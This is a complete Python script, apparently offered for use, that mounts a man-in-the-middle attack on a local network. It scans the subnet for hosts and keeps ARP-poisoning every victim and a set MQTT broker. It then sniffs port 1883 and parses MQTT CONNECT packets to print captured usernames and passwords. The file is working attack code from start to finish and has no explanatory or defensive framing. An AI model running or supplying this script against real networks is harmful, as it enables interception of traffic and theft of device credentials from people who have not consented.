#!/usr/bin/env python3
# MQTT MITM Credential Sniffer (for plaintext only)

import os
import time
import socket
import struct
from scapy.all import ARP, Ether, srp, send, sniff, Raw, TCP
from threading import Thread
from ipaddress import IPv4Network

# ─── CONFIG ─────────────────────────────────────────────────────────
BROKER_IP = "192.168.10.1"
INTERFACE = "eth0"

# ─── GET SUBNET AUTOMATICALLY ──────────────────────────────────────
def get_local_subnet():
    ip = socket.gethostbyname(socket.gethostname())
    return ip.rsplit('.', 1)[0] + ".0/24"

# ─── DISCOVER DEVICES ───────────────────────────────────────────────
def get_all_devices(subnet):
    print("[*] Discovering live devices…")
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
        timeout=2,
        iface=INTERFACE,
        verbose=False,
    )
    return [rcv.psrc for _, rcv in answered]

# ─── MAC RESOLUTION ─────────────────────────────────────────────────
def get_mac(ip):
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        iface=INTERFACE,
        verbose=False,
    )
    for _, rcv in ans:
        return rcv[Ether].src
    return None

# ─── ARP SPOOFING ───────────────────────────────────────────────────
def spoof_targets(broker_ip, broker_mac, victim_ips, mac_map):
    print("[*] Starting ARP spoof loop...")
    def spoof():
        while True:
            for victim_ip in victim_ips:
                victim_mac = mac_map.get(victim_ip)
                if not victim_mac:
                    continue
                # Tell victim the broker's IP is at attacker's MAC
                send(ARP(op=2, pdst=victim_ip, psrc=broker_ip, hwdst=victim_mac), verbose=False)
                # Tell broker the victim's IP is at attacker's MAC
                send(ARP(op=2, pdst=broker_ip, psrc=victim_ip, hwdst=broker_mac), verbose=False)
            time.sleep(2)
    Thread(target=spoof, daemon=True).start()

# ─── SNIFF MQTT CREDENTIALS ─────────────────────────────────────────
def extract_credentials(pkt):
    if Raw in pkt and pkt.haslayer(TCP) and pkt[TCP].dport == 1883:
        payload = pkt[Raw].load
        if payload[0] == 0x10:  # CONNECT
            try:
                i = 2
                proto_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2 + proto_len + 4  # skip protocol name, version, flags, keepalive
                client_id_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2 + client_id_len
                username_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2
                username = payload[i:i+username_len].decode(errors="ignore")
                i += username_len
                password_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2
                password = payload[i:i+password_len].decode(errors="ignore")
                print(f"[+] MQTT Credentials → Username: '{username}' | Password: '{password}'")
            except Exception:
                pass

def sniff_credentials():
    print("[*] Sniffing MQTT credentials on port 1883…")
    sniff(iface=INTERFACE, filter="tcp port 1883", prn=extract_credentials, store=0)

# ─── MAIN ───────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"[*] Broker: {BROKER_IP}")
    subnet = get_local_subnet()
    print(f"[*] Subnet: {subnet}")
    
    victim_ips = [ip for ip in get_all_devices(subnet) if ip != BROKER_IP]
    print(f"[+] Victims: {', '.join(victim_ips)}")
    
    print("[*] Caching MAC addresses…")
    broker_mac = get_mac(BROKER_IP)
    print(f"[+] Broker MAC: {broker_mac}")
    mac_map = {ip: get_mac(ip) for ip in victim_ips}
    print("[+] Victim MACs:")
    for ip, mac in mac_map.items():
        print(f"    {ip} → {mac}")

    spoof_targets(BROKER_IP, broker_mac, victim_ips, mac_map)
    sniff_credentials()

